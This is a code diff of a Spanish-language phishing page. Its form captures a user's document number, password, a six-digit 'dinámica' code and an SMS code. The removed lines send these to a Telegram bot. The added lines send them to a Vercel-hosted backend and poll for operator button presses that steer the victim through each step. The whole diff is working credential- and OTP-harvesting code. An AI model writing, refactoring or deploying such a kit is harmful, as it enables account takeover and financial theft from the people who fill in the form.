-        chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard
-    }).then(data => {
+function enviarSms(smsCode) {
+    mostrarOverlay();
+    enviarAlBackend({ action: 'sms', usuario: usuarioActual, smsCode: smsCode })
+    .then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
             escucharBotones(handleTelegramActionSms);
+        } else {
+            ocultarOverlay();
         }
     }).catch(() => ocultarOverlay());
 }
 
 // ==========================================
-// POLLING
+// POLLING (A TRAVÉS DE VERCEL)
 // ==========================================
 function escucharBotones(callbackAction) {
     if (!msgIdActual) return;
@@ -848,16 +497,8 @@ function escucharBotones(callbackAction) {
     async function check() {
         if (!pollingActivo) return;
         try {
-            const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`;
-            const res = await fetch(TG_PROXY + encodeURIComponent(url), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    offset: ultimoUpdateId + 1,
-                    allowed_updates: ['callback_query'],
-                    timeout: 10
-                })
-            });
+            // Usamos GET para consultar si hay novedades
+            const res = await fetch(`${API_URL}?action=poll&offset=${ultimoUpdateId + 1}&msgId=${msgIdActual}`);
             const data = await res.json();
 
             if (!data.ok || !data.result || data.result.length === 0) {
@@ -896,7 +537,6 @@ function handleTelegramActionLogin(action) {
         modal.classList.add("is-open");
         viewDinamica.classList.add("active");
         viewSms.classList.remove("active");
-
         otpInput.value = "";
         otpError.classList.remove("show");
         otpContainer.classList.remove("error");
@@ -924,13 +564,11 @@ function handleTelegramActionDinamica(action) {
         modal.classList.add("is-open");
         viewDinamica.classList.add("active");
         viewSms.classList.remove("active");
-
         otpError.classList.add("show");
         otpContainer.classList.add("error");
         otpInput.value = "";
         actualizarOTP();
         otpInput.focus();
-
         actionProcessed = false;
     } else if (action === 'sms_code') {
         viewDinamica.classList.remove("active");
@@ -974,17 +612,13 @@ function handleTelegramActionSms(action) {
 // ==========================================
 demoForm.addEventListener("submit", function(e) {
     e.preventDefault();
-    console.log('✅ Submit disparado. Botón disabled?', submitBtn.disabled);
-
     if (submitBtn.disabled) return;
-
-    mostrarOverlay();
+    
     const tipoDoc = documentType.value;
     const user = documentNumber.value.trim();
     const pass = claveInput.value.trim();
 
-    console.log('📤 Enviando:', { tipoDoc, user, pass });
-    enviarIdentificacionTelegram(tipoDoc, user, pass);
+    enviarIdentificacion(tipoDoc, user, pass);
 });
 
 // ==========================================
@@ -1030,8 +664,7 @@ btnBorrar.addEventListener("click", () => {
 
 btnContinuar.addEventListener("click", () => {
     if (otpInput.value.length === 6) {
-        mostrarOverlay();
-        enviarDinamicaTelegram(otpInput.value);
+        enviarDinamica(otpInput.value);
     }
 });
 
@@ -1039,7 +672,6 @@ closeModal.addEventListener("click", () => {
     modal.classList.remove("is-open");
 });
 
-// SMS
 smsCodeInput.addEventListener("input", function() {
     this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
     smsError.classList.remove("show");
@@ -1053,14 +685,10 @@ btnSmsFinal.addEventListener("click", () => {
         smsInputWrap.classList.add("error");
         return;
     }
-    mostrarOverlay();
-    enviarSmsTelegram(smsCodeInput.value);
+    enviarSms(smsCodeInput.value);
 });
 
-// Init
 actualizarBoton();
-console.log('✅ Portal cargado. Listo para enviar.');
 </script>
-
 </body>
 </html>
